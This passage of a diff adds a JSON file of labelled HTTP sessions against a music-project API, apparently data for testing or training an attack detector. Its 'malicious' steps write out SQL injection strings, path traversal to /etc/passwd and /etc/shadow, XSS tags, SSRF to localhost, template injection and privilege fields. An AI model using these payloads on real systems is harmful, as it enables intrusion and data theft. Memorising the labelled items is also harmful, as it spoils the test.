+        },
+        "note": "The designer creates a project."
+      },
+      {
+        "id": "sess050-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-50-extra",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token50"
+        },
+        "body": null,
+        "note": "The designer checks a secondary owned project ID in workflow."
+      }
+    ]
+  },
+  {
+    "session_id": "sess051",
+    "client_ip": "10.11.12.13",
+    "steps": [
+      {
+        "id": "sess051-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer51@example.com",
+          "password": "Password51!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess051-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token51"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess051-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token51",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Project' OR '1'='1",
+          "description": "SQL injection in title"
+        },
+        "note": "The client injects a boolean-based SQL query into the title field."
+      },
+      {
+        "id": "sess051-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-51",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token51"
+        },
+        "body": null,
+        "note": "The designer views project 51."
+      }
+    ]
+  },
+  {
+    "session_id": "sess052",
+    "client_ip": "192.168.80.90",
+    "steps": [
+      {
+        "id": "sess052-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/auth/register",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Comment": "Registration note\nwith a sentence continuing on next line."
+        },
+        "body": {
+          "email": "designer52@example.com",
+          "password": "Password52!"
+        },
+        "note": "The client includes a header with a newline sentence continuation."
+      },
+      {
+        "id": "sess052-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer52@example.com",
+          "password": "Password52!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess052-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token52"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess052-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess053",
+    "client_ip": "172.16.70.30",
+    "steps": [
+      {
+        "id": "sess053-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer53@example.com",
+          "password": "Password53!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess053-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token53"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess053-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-other-777",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token53"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word other is only part of the id string."
+      },
+      {
+        "id": "sess053-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-53",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token53"
+        },
+        "body": null,
+        "note": "The designer checks their own project."
+      }
+    ]
+  },
+  {
+    "session_id": "sess054",
+    "client_ip": "10.20.30.50",
+    "steps": [
+      {
+        "id": "sess054-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer54@example.com",
+          "password": "Password54!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess054-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token54"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess054-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token54",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Album Release",
+          "description": "Standard pressing",
+          "extra_field": "harmless_attribute"
+        },
+        "note": "The client includes a harmless extra field in the body."
+      },
+      {
+        "id": "sess054-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-54",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token54"
+        },
+        "body": null,
+        "note": "The designer views project 54."
+      }
+    ]
+  },
+  {
+    "session_id": "sess055",
+    "client_ip": "192.168.90.10",
+    "steps": [
+      {
+        "id": "sess055-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token55",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Admin Access",
+          "permission_level": "root"
+        },
+        "note": "The client passes an uncontracted privilege field."
+      },
+      {
+        "id": "sess055-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer55@example.com",
+          "password": "Password55!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess055-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token55"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess055-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess056",
+    "client_ip": "172.30.50.60",
+    "steps": [
+      {
+        "id": "sess056-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer56@example.com",
+          "password": "Password56!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess056-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token56"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess056-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../etc/passwd",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token56"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal."
+      },
+      {
+        "id": "sess056-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-56",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token56"
+        },
+        "body": null,
+        "note": "The designer checks project 56."
+      }
+    ]
+  },
+  {
+    "session_id": "sess057",
+    "client_ip": "10.40.50.60",
+    "steps": [
+      {
+        "id": "sess057-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer57@example.com",
+          "password": "Password57!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess057-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token57"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess057-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects/proj-57/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token57",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Vinyl's Track",
+          "durationSeconds": 140
+        },
+        "note": "The client includes an apostrophe in the track name."
+      },
+      {
+        "id": "sess057-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-57/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token57"
+        },
+        "body": null,
+        "note": "The designer views track lists."
+      }
+    ]
+  },
+  {
+    "session_id": "sess058",
+    "client_ip": "192.168.100.15",
+    "steps": [
+      {
+        "id": "sess058-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer58@example.com",
+          "password": "Password58!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess058-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token58"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess058-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/trk-58/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token58",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "<script>alert('XSS')</script>"
+        },
+        "note": "The client attempts browser-executed code injection."
+      },
+      {
+        "id": "sess058-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/trk-58/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token58"
+        },
+        "body": null,
+        "note": "The designer views notes."
+      }
+    ]
+  },
+  {
+    "session_id": "sess059",
+    "client_ip": "172.16.80.40",
+    "steps": [
+      {
+        "id": "sess059-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer59@example.com",
+          "password": "Password59!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess059-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token59"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess059-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token59",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Internal Fetch",
+          "description": "http://127.0.0.1:3000/admin"
+        },
+        "note": "The client attempts an internal address SSRF injection."
+      },
+      {
+        "id": "sess059-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess060",
+    "client_ip": "10.50.60.70",
+    "steps": [
+      {
+        "id": "sess060-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer60@example.com",
+          "password": "Password60!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess060-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token60"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess060-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-60",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token60"
+        },
+        "body": null,
+        "note": "The designer views project 60."
+      },
+      {
+        "id": "sess060-s04",
+        "suspicious_benign": true,
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-60/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token60",
+          "X-Reference": "Mentioning remote code execution conceptually in header."
+        },
+        "body": null,
+        "note": "The client mentions a technical attack term in a header."
+      }
+    ]
+  },
+  {
+    "session_id": "sess061",
+    "client_ip": "192.168.110.20",
+    "steps": [
+      {
+        "id": "sess061-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer61@example.com",
+          "password": "Password61!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess061-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token61"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess061-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token61",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "${7*7}",
+          "description": "Template evaluation"
+        },
+        "note": "The client injects a template expression string."
+      },
+      {
+        "id": "sess061-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-61",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token61"
+        },
+        "body": null,
+        "note": "The designer views project 61."
+      }
+    ]
+  },
+  {
+    "session_id": "sess062",
+    "client_ip": "172.25.60.70",
+    "steps": [
+      {
+        "id": "sess062-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer62@example.com",
+          "password": "Password62!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess062-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token62"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess062-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token62",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Serialized Object 3",
+          "description": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hc..."
+        },
+        "note": "The client posts a serialized object payload."
+      },
+      {
+        "id": "sess062-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess063",
+    "client_ip": "10.60.70.90",
+    "steps": [
+      {
+        "id": "sess063-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer63@example.com",
+          "password": "Password63!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess063-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token63"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess063-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects/proj-63/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token63",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "trackName": "Track Song\n[WARNING] 2026-03-30 16:11:00 Log injection test.",
+          "durationSeconds": 175
+        },
+        "note": "The client injects a log stamp with a newline."
+      },
+      {
+        "id": "sess063-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-63/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token63"
+        },
+        "body": null,
+        "note": "The designer views project tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess064",
+    "client_ip": "192.168.120.30",
+    "steps": [
+      {
+        "id": "sess064-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Session-Info": "User login session\nwith a sentence continuing on the next line."
+        },
+        "body": {
+          "email": "designer64@example.com",
+          "password": "Password64!"
+        },
+        "note": "The client logs in with a header containing a newline sentence continuation."
+      },
+      {
+        "id": "sess064-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token64"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess064-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-64",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token64"
+        },
+        "body": null,
+        "note": "The designer views project 64."
+      },
+      {
+        "id": "sess064-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-64/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token64"
+        },
+        "body": null,
+        "note": "The designer views tracks."
+      }
+    ]
+  },
+  {
+    "session_id": "sess065",
+    "client_ip": "172.16.90.50",
+    "steps": [
+      {
+        "id": "sess065-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer65@example.com",
+          "password": "Password65!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess065-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token65"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess065-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token65",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "SQL Injection 3",
+          "description": "' OR 'a'='a"
+        },
+        "note": "The client performs a SQL injection attack in description."
+      },
+      {
+        "id": "sess065-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess066",
+    "client_ip": "10.70.80.11",
+    "steps": [
+      {
+        "id": "sess066-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer66@example.com",
+          "password": "Password66!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess066-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token66"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess066-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-66",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token66"
+        },
+        "body": null,
+        "note": "The designer views project 66."
+      },
+      {
+        "id": "sess066-s04",
+        "suspicious_benign": true,
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-66/tracks",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token66",
+          "X-Note": "Mentioning path traversal concept."
+        },
+        "body": null,
+        "note": "The client mentions a security term in a header."
+      }
+    ]
+  },
+  {
+    "session_id": "sess067",
+    "client_ip": "192.168.130.40",
+    "steps": [
+      {
+        "id": "sess067-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/projects/proj-foreign-555",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token67"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. The word foreign is only part of the id string."
+      },
+      {
+        "id": "sess067-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer67@example.com",
+          "password": "Password67!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess067-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token67"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess067-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess068",
+    "client_ip": "172.28.40.20",
+    "steps": [
+      {
+        "id": "sess068-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer68@example.com",
+          "password": "Password68!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess068-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token68"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess068-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token68",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Privilege Escalation 2",
+          "admin_access": true
+        },
+        "note": "The client passes an uncontracted privilege field."
+      },
+      {
+        "id": "sess068-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-68",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token68"
+        },
+        "body": null,
+        "note": "The designer views project 68."
+      }
+    ]
+  },
+  {
+    "session_id": "sess069",
+    "client_ip": "10.80.90.22",
+    "steps": [
+      {
+        "id": "sess069-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer69@example.com",
+          "password": "Password69!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess069-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token69"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess069-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/projects/../../etc/shadow",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token69"
+        },
+        "body": null,
+        "note": "The client attempts directory traversal to shadow."
+      },
+      {
+        "id": "sess069-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess070",
+    "client_ip": "192.168.140.50",
+    "steps": [
+      {
+        "id": "sess070-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer70@example.com",
+          "password": "Password70!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess070-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token70"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess070-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token70",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Vinyl Record",
+          "description": "Standard pressing",
+          "metadata_tag": "release_version_one"
+        },
+        "note": "The client includes a harmless extra metadata field."
+      },
+      {
+        "id": "sess070-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-70",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token70"
+        },
+        "body": null,
+        "note": "The designer views project 70."
+      }
+    ]
+  },
+  {
+    "session_id": "sess071",
+    "client_ip": "172.16.100.10",
+    "steps": [
+      {
+        "id": "sess071-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer71@example.com",
+          "password": "Password71!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess071-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token71"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess071-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/tracks/trk-71/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token71",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "content": "<svg onload=alert(1)>"
+        },
+        "note": "The client attempts XSS via SVG onload attribute."
+      },
+      {
+        "id": "sess071-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/tracks/trk-71/notes",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token71"
+        },
+        "body": null,
+        "note": "The designer views notes."
+      }
+    ]
+  },
+  {
+    "session_id": "sess072",
+    "client_ip": "10.90.100.20",
+    "steps": [
+      {
+        "id": "sess072-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer72@example.com",
+          "password": "Password72!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess072-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token72"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess072-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token72",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "SSRF Local",
+          "description": "http://127.0.0.1:8080/metrics"
+        },
+        "note": "The client attempts SSRF targeting local metrics."
+      },
+      {
+        "id": "sess072-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess073",
+    "client_ip": "192.168.150.60",
+    "steps": [
+      {
+        "id": "sess073-s01",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {
+          "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.0; AK)"
+        },
+        "body": null,
+        "note": "The client checks status using an ancient browser agent."
+      },
+      {
+        "id": "sess073-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer73@example.com",
+          "password": "Password73!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess073-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token73"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess073-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-73",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token73"
+        },
+        "body": null,
+        "note": "The designer views project 73."
+      }
+    ]
+  },
+  {
+    "session_id": "sess074",
+    "client_ip": "172.32.10.20",
+    "steps": [
+      {
+        "id": "sess074-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer74@example.com",
+          "password": "Password74!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess074-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token74"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess074-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token74",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "${java.net.InetAddress.getLocalHost()}",
+          "description": "Template execution expression"
+        },
+        "note": "The client injects a Java template execution expression."
+      },
+      {
+        "id": "sess074-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/system/status",
+        "query": {},
+        "headers": {},
+        "body": null,
+        "note": "The client checks system health."
+      }
+    ]
+  },
+  {
+    "session_id": "sess075",
+    "client_ip": "10.100.200.10",
+    "steps": [
+      {
+        "id": "sess075-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "email": "designer75@example.com",
+          "password": "Password75!"
+        },
+        "note": "The designer logs in."
+      },
+      {
+        "id": "sess075-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token75"
+        },
+        "body": null,
+        "note": "The designer lists projects."
+      },
+      {
+        "id": "sess075-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/projects",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token75",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "title": "Serialized Object 4",
+          "description": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hc..."
+        },
+        "note": "The client posts a serialized object payload."
+      },
+      {
+        "id": "sess075-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/projects/proj-75",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token75"
+        },
+        "body": null,
+        "note": "The designer views project 75."
+      }
+    ]
+  },
+  {
+    "session_id": "sess076",
+    "client_ip": "192.168.160.70",
+    "steps": [
+      {
+        "id": "sess076-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/auth/login",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
